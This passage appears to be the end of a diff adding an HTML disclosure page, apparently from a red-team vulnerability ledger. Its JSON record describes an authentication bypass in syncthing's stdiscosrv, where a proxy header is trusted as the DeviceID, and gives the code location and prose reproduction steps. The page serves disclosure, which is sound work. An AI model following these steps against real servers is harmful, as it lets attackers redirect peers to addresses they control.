%224.%20Handler%20accepts%20the%20header%20as%20the%20DeviceID%20and%20calls%20db.merge%28%26deviceID%2C%20dbAddrs%2C%20seen%29%20at%20apisrv.go%3A326%2C%20persisting%20the%20spoofed%20record.%22%5D%2C%22technical_details%22%3A%22stdiscosrv%20POST%20/%20handler%20accepts%20an%20attacker-supplied%20proxy%20header%20as%20the%20client%20DeviceID%20when%20no%20TLS%20client%20certificate%20is%20presented%2C%20and%20writes%20the%20announced%20addresses%20to%20db.merge%28%26deviceID%2C%20dbAddrs%2C%20seen%29%20at%20apisrv.go%3A326.%20On%20the%20default%20direct-TLS%20configuration%2C%20any%20internet%20client%20can%20register/overwrite%20addresses%20for%20any%20victim%20DeviceID%2C%20breaking%20the%20discovery%20server%27s%20identity-binding%20guarantee.%22%2C%22title%22%3A%22stdiscosrv%20trusts%20proxy%20header%20for%20client%20identity%20in%20direct-TLS%20mode%20%E2%86%92%20DeviceID%20poisoning%22%2C%22vendor_severity%22%3A%22high%22%7D">Verify (download preimage.json)</a>
+</p>
+<details class="preimage">
+  <summary>Show preimage JSON</summary>
+  <pre class="preimage-body">{
+  &#34;ant_id&#34;: &#34;ANT-2026-B324R0JY&#34;,
+  &#34;bug_class&#34;: &#34;auth_bypass&#34;,
+  &#34;claude_severity&#34;: &#34;critical&#34;,
+  &#34;commit_sha&#34;: null,
+  &#34;created_at&#34;: &#34;2026-04-10T23:56:33+00:00&#34;,
+  &#34;description&#34;: &#34;In stdiscosrv&#39;s announcement endpoint (POST /), when the connection lacks a TLS client certificate the handler falls back to reading the client DeviceID from a proxy header that the remote client fully controls. That spoofed DeviceID and the announced addresses are passed to db.merge(&amp;deviceID, dbAddrs, seen) at apisrv.go:326 and persisted. Under the default direct-TLS deployment (no fronting proxy), any internet client can therefore create or overwrite the discovery record for an arbitrary victim DeviceID. This breaks the discovery server&#39;s core identity-binding guarantee and lets an attacker point peers looking up the victim to attacker-chosen addresses.&#34;,
+  &#34;discovered_at&#34;: null,
+  &#34;location&#34;: &#34;cmd/stdiscosrv/apisrv.go:326&#34;,
+  &#34;poc_sha256&#34;: null,
+  &#34;preimage_version&#34;: 1,
+  &#34;project&#34;: &#34;syncthing/syncthing&#34;,
+  &#34;reproduction&#34;: [
+    &#34;1. Connect to stdiscosrv&#39;s POST / endpoint without presenting a TLS client certificate.&#34;,
+    &#34;2. Set the proxy header to the target victim&#39;s DeviceID.&#34;,
+    &#34;3. Submit an announcement body containing attacker-controlled addresses.&#34;,
+    &#34;4. Handler accepts the header as the DeviceID and calls db.merge(&amp;deviceID, dbAddrs, seen) at apisrv.go:326, persisting the spoofed record.&#34;
+  ],
+  &#34;technical_details&#34;: &#34;stdiscosrv POST / handler accepts an attacker-supplied proxy header as the client DeviceID when no TLS client certificate is presented, and writes the announced addresses to db.merge(&amp;deviceID, dbAddrs, seen) at apisrv.go:326. On the default direct-TLS configuration, any internet client can register/overwrite addresses for any victim DeviceID, breaking the discovery server&#39;s identity-binding guarantee.&#34;,
+  &#34;title&#34;: &#34;stdiscosrv trusts proxy header for client identity in direct-TLS mode → DeviceID poisoning&#34;,
+  &#34;vendor_severity&#34;: &#34;high&#34;
+}</pre>
+</details>
+</main>
+<footer>
+  <p>Anthropic Frontier Red Team</p>
+  <p>Snapshot generated at 2026-11-02 19:30 UTC</p>
+  <p>Dates and times are in UTC</p>
+  <p>Manifest hash <code>25d811e7b56632ef5bbb23eb…</code></p>
+  <p>Archived snapshots remain available at their dated paths so any figure can be verified against the page that was live on that date</p>
+  <p><a href="../data/payload.json">payload.json</a></p>
+</footer>
+<script src="../assets/figures.js" data-root="../"></script>
+<script src="../assets/ledger.js"></script>
+</body>
+</html>
